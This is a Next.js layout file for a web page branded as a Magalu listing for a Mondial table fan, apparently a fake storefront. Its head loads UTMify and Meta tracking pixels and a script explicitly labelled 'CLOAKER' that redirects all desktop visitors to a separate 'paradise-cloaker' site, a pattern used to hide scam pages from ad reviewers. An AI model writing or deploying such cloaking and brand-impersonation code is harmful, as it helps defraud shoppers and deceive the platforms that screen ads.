import React from "react"
import type { Metadata, Viewport } from "next"
import { Nunito, Nunito_Sans } from "next/font/google"
import Script from "next/script"

import "./globals.css"

const nunito = Nunito({
  subsets: ["latin"],
  variable: "--font-nunito",
  weight: ["400", "600", "700", "800", "900"],
})

const nunitoSans = Nunito_Sans({
  subsets: ["latin"],
  variable: "--font-nunito-sans",
  weight: ["400", "600", "700", "800"],
})

export const metadata: Metadata = {
  title: "Magalu - Ventilador de Mesa Mondial VTX-40-8P",
  description:
    "Compre Ventilador de Mesa Mondial VTX-40-8P 40cm 3 Velocidades com os melhores precos. Confira!",
}

export const viewport: Viewport = {
  themeColor: "#0086FF",
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="pt-BR">
      <head>

        {/* UTMIFY */}
        <Script id="utmify-pixel" strategy="afterInteractive">
          {`
            window.pixelId = "698c093449ba892bf8a17de4";
            var a = document.createElement("script");
            a.setAttribute("async", "");
            a.setAttribute("defer", "");
            a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
            document.head.appendChild(a);
          `}
        </Script>

        {/* META PIXEL */}
        <Script id="facebook-pixel" strategy="afterInteractive">
          {`
            !function(f,b,e,v,n,t,s)
            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
            n.queue=[];t=b.createElement(e);t.async=!0;
            t.src=v;s=b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t,s)}(window, document,'script',
            'https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', '879701095037268');
            fbq('track', 'PageView');
          `}
        </Script>

        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=879701095037268&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>

        {/* CLOAKER */}
        <Script id="cloaker" strategy="afterInteractive">
          {`
            var url_link_redirect_pc = "https://v0-paradise-cloaker-script.vercel.app/";

            function isMobile() {
              const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
              return regex.test(navigator.userAgent);
            }

            if (!isMobile()) {
              window.location.href = url_link_redirect_pc;
            }
          `}
        </Script>

      </head>

      <body
        className={`${nunito.variable} ${nunitoSans.variable} font-sans antialiased`}
      >
        {children}
      </body>
    </html>
  )
}
